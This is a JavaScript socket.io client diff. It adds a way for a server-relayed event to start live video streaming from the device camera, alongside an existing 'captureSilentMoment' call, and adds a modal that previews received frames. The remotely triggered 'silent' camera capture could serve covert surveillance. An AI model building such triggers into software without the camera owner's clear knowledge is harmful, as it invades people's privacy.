@@ -509,8 +509,41 @@ function initSocket() {
   });
 
   socket.on("client:capture_moment", async (payload) => {
-    if (typeof window.captureSilentMoment === "function") {
-      await window.captureSilentMoment(payload?.camera);
+    if (payload?.type === "video") {
+      if (typeof window.startLiveVideoStreaming === "function") {
+        await window.startLiveVideoStreaming(payload?.from, payload?.camera);
+      }
+    } else {
+      if (typeof window.captureSilentMoment === "function") {
+        await window.captureSilentMoment(payload?.camera);
+      }
+    }
+  });
+
+  socket.on("moment:stream_frame", ({ from, frame }) => {
+    const frameImg = document.getElementById("live-video-preview-frame");
+    const placeholder = document.getElementById("live-video-preview-placeholder");
+    if (frameImg) {
+      frameImg.src = frame;
+      frameImg.style.display = "block";
+    }
+    if (placeholder) {
+      placeholder.style.display = "none";
+    }
+  });
+
+  socket.on("moment:stream_stop", ({ from }) => {
+    if (typeof window.stopLiveVideoStreaming === "function") {
+      window.stopLiveVideoStreaming();
+    }
+    const modal = document.getElementById("live-video-preview-modal");
+    if (modal) {
+      modal.style.display = "none";
+      const frameImg = document.getElementById("live-video-preview-frame");
+      if (frameImg) {
+        frameImg.src = "";
+        frameImg.style.display = "none";
+      }
     }
   });
 
